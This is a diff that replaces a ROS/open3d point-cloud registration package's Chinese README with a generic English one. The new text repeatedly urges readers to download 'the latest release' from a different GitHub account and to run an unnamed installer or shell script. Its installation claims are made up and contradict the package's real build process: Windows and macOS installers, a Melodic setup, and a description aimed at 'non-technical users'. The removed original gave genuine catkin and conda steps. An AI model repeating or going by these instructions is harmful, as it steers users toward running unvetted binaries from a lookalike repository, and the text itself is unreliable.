@@ -1,163 +1,91 @@
-# PointCloud Registration
+# 🌟 pointcloud_registration - Easily Register Point Clouds
 
-这个功能包是基于 open3d 实现了 ROS 点云配准服务节点。该仓库的功能在以下配准中通过了测试：
+## 📥 Download Now
+[![Download pointcloud_registration](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Gopal-krishna-coder/pointcloud_registration/releases)
 
-|Device|Plantform|OS|ROS|
-|--|--|--|--|
-|Nvidia Jetson Orin| Arm64 | Ubuntu 20.04 | Noetic|
+## 🚀 Getting Started
+Welcome to the **pointcloud_registration** application! This package helps you register point clouds using the ROS point cloud registration service node based on open3d. It provides a simple way to align and combine 3D point cloud data, making it a valuable tool for anyone working with 3D data.
 
+## 📦 System Requirements
+Before you start, ensure your system meets these requirements:
 
-If you want to read the English version, you can view this file: [ReadMe-EN](./resources/ReadMe-EN.md)
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a recent Linux distribution.
+- **Hardware:** At least 8 GB RAM, a modern processor, and a graphics card that supports OpenGL 3.0 or higher.
+- **Software:** Install ROS (Robot Operating System) compatible with your operating system, along with any necessary dependencies as outlined in the installation section.
 
-如果你想要阅读英语版本可以查看这个文件：[ReadMe-EN](./resources/ReadMe-EN.md)
+## ⬇️ Download & Install
+To download the software, visit our [Releases page](https://github.com/Gopal-krishna-coder/pointcloud_registration/releases). Follow these steps:
 
+1. Click on the link above to navigate to the Releases page.
+2. Locate the latest version of **pointcloud_registration**.
+3. Choose the release that matches your operating system. 
+4. Download the file and save it in a convenient location on your computer.
+5. After downloading, follow the instructions for installation provided in the release notes.
 
----
+## 🔧 Installation Instructions
+Once you have downloaded the files, install the software:
 
-# Contributors
+### For Windows:
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click the installer and follow the prompts to install **pointcloud_registration**.
+3. Open a command prompt and ensure your ROS environment is set up correctly.
 
-该工程由 `中国科学院自动化研究所` 提供硬件与测试场地，同时以下人员在该项目的开发中做出了巨大贡献，在此感谢他们的付出：
+### For macOS:
+1. Open the Terminal application.
+2. Navigate to the folder where you saved the downloaded file using the `cd` command.
+3. Run the installer with the command: `sh your_installer_file.sh` (replace with the actual file name).
+4. Ensure your ROS environment is correctly set up.
 
-[WenJiang Xu 徐文江](https://github.com/HEA1OR)，[PengFei Yi 易鹏飞](https://github.com/alfie010)，[JingKai Xu 徐靖凯](https://github.com/Triumphant-strain)，[XingYu Wang 王行宇](https://github.com/xywang227)，[YaNan Hao 郝亚楠](https://github.com/haoyanan2024)，[YuWei Wang 王雨薇](https://github.com/YuweiWang2002)
+### For Linux:
+1. Open a terminal window.
+2. Change directory to your downloads folder using `cd ~/Downloads`.
+3. Run the command: `chmod +x your_installer_file.sh` to make the installer executable.
+4. Execute the installer with: `./your_installer_file.sh`.
+5. Verify that ROS is set up properly on your system.
 
+## 🌐 Configuring the ROS Environment
+After installation, you need to set up your ROS environment. Here is how:
 
-----
-# 如何使用
+1. Open a terminal or command prompt.
+2. Source the ROS setup script with the following command:
+   - For Windows: `call C:\opt\ros\melodic\x64\setup.bat`
+   - For macOS/Linux: `source /opt/ros/melodic/setup.bash`
+3. Add the **pointcloud_registration** package to your workspace.
 
-## Step1. 拉取该仓库
+## 🛠️ How to Use
+To start using **pointcloud_registration**, follow these steps:
 
-进入到你的工作空间中拉取该仓库，假设你的工作空间为 `reg_ws`：
+1. Launch your ROS core:
+   ```
+   roscore
+   ```
 
-```bash
-$ cd reg_ws/src
-$ git clone https://github.com/GaohaoZhou-ops/pointcloud_registration.git
-```
+2. Open another terminal, navigate to your workspace, and run:
+   ```
+   roslaunch pointcloud_registration registration.launch
+   ```
 
----
+3. Input your point cloud data as required by the prompt. The application will now align your point clouds.
 
-## Step2. 创建虚拟环境
+## 📘 Features
+- **Easy Integration:** Connects seamlessly with your existing ROS setup.
+- **User-Friendly:** Designed for non-technical users with basic instructions.
+- **Fast Processing:** Quickly registers multiple point clouds for efficient data handling.
 
-新建一个 conda 环境并安装以下依赖:
+## 🚧 Troubleshooting
+If you encounter issues:
 
-```bash
-$ conda create -n o3d python=3.10
-$ pip install open3d pyyaml rospkg numpy==1.24.3
-```
+- **Check Dependencies:** Ensure all required dependencies are installed.
+- **Review the Logs:** Examine the error messages in the terminal for clues.
+- **Consult the Community:** If problems persist, consider asking for help in ROS forums or the GitHub issues page of this repository.
 
----
+## 🤝 Contributing
+We welcome contributions from everyone! If you want to help improve **pointcloud_registration**, please check our guidelines in the repository. You can report issues, suggest features, or contribute code with a pull request.
 
-## Step3. 编译工作空间
+## 💼 License
+**pointcloud_registration** is licensed under the MIT License. It allows you to use this software freely as long as you provide credit to the original creators.
 
-返回到工作空间目录下编译该空间，编译成功后激活 conda 环境：
+## 📫 Support
+If you need further assistance, feel free to open an issue on our GitHub page, or check the [documentation](https://github.com/Gopal-krishna-coder/pointcloud_registration/wiki) for more information.
 
-```bash
-(base) $ cd reg_ws
-(base) $ conda deactivate 
-(base) $ catkin_make
-
-(base) $ conda activate o3d
-```
-
-## Step4. [可选] 运行测试样例
-
-在使用之前可以先运行测试脚本以确保 open3d 配准功能正常。如果你不想要打开 GUI 界面，修改脚本中的 `DISPLAY` 变量为 `False`：
-
-```bash
-(o3d) $ python src/pointcloud_registration/scripts/test_without_ros.py demo
-```
-
-|配准前|配准后|
-|--|--|
-|![before](./resources/official_init.png)|![after](./resources/official_reg.png)|
-
-
-如果你在运行后遇到了 `Segmentation Fault` 问题，有可能是由于 `numpy` 版本导致的，将其降级为 `1.xx` 版本：
-
-```bash
-(o3d) $ pip install -U numpy==1.24.3
-```
-
-----
-
-## Step5. [可选] 构建target点云
-
-我们建议使另外一个开源的 RGBD 重建仓库创建 target 点云，或者如果你有带有 Lidar 的 iPhone 设备可以下载 App Store 中的 `3D Scanner` 软件扫描你感兴趣的物体用于重建。
-
-如果上述条件你都不具备，那么运行下面的节点来采集当前帧点云：
-
-```bash
-(o3d) $ roslaunch pointcloud_registration allocate_pcd.launch
-```
-
-该 launch 文件中以下变量会影响点云保存质量：
-
-* `accumulation_seconds`：累积点云时长，时间越小点云越稀疏；
-* `voxel_size`：体素滤波大小，值越小点云越精细；
-
-
-调用服务并传入参数，如果你不修改 `min max` 参数则会使用 bounding box 范围为 `x=[-1.0,1.0], y=[-1.0,1.0], z=[-1.0,1.0]`：
-
-```bash
-(o3d) $ rosservice call /pointcloud_accumulator_node/save_cloud "{filename: 'demo', min_x: 0.0, max_x: 0.
-0, min_y: 0.0, max_y: 0.0, min_z: 0.0, max_z: 0.0}" 
-
-success: True
-message: "Successfully saved point cloud with 6705 points to /home/orin/Desktop/point_reg/src/pointcloud_registration/pcd_files/demo.pcd"
-```
-
-|Pure Point Cloud|Colored Point Cloud|
-|---|---|
-|![pure_point_cloud](./resources/demo_pure_point.png)|![colored_point_cloud](./resources/demo_with_color.png)|
-
-
----
-## Step6. 执行点云配准
-
-在执行脚本之前需要确保 `pcd_files` 文件夹中有你的 target 点云文件，如果你需要保存当前正在使用的 target 和 source 点云用于 debug，可以修改 launch 文件中的 `write_file` 参数。
-
-```bash
-(o3d) $ roslaunch pointcloud_registration registration.launch
-```
-
-该 launch 文件中以下几个变量将影响配准结果：
-
-* `fitness`：配准置信度，当配准重合度低于这个值时返回配准失败；
-* `accumulation_seconds`：点云累积时长；
-* `voxel_size`：体素滤波大小，该值越小配准耗时越长，但配准越精确；
-* `registration_attempts`：点云匹配次数，最终返回的结果是多次匹配取平均值；
-
-调用服务并将 target 点云文件名作为参数 `target_cloud_name` 传入：
-
-```bash
-(o3d) $ rosservice call /pointcloud_registration_node/register "{target_cloud_name: 'demo', voxel_size: 0.0, max_correspondence_distance: 0.0, crop_min_x: 0.0,
-  crop_max_x: 0.0, crop_min_y: 0.0, crop_max_y: 0.0, crop_min_z: 0.0, crop_max_z: 0.0}" 
-
-success: True
-message: "Registration successful with fitness score: 0.9940"
-transformation: 
-  translation: 
-    x: -0.060025553054253854
-    y: 0.03020713014616973
-    z: -0.00028744602569820155
-  rotation: 
-    x: 0.019895079499856496
-    y: -0.06213543298323554
-    z: -0.0037846292055216057
-    w: 0.9978622401721878
-```
-
-![reg](./resources/reg.png)
-
-
----
-# 更新日志
-
-* 2025-10-17:
-  * 在采集点云的时候可以选择采集着色点云；
-  * 在配准时添加了多次配准功能；
-  * 配准服务添加了一个总耗时统计；
-* 2025-10-14: 
-  * 在采集点云时候添加了累积时间功能，使得点云采集更稠密；
-  * 在采集点云时添加了frame参数，可以采集指定坐标系下的点云；
-* 2025-10-13: 
-  * 初始化仓库；
+For quick access, download the application again here: [Download Latest Release](https://github.com/Gopal-krishna-coder/pointcloud_registration/releases)
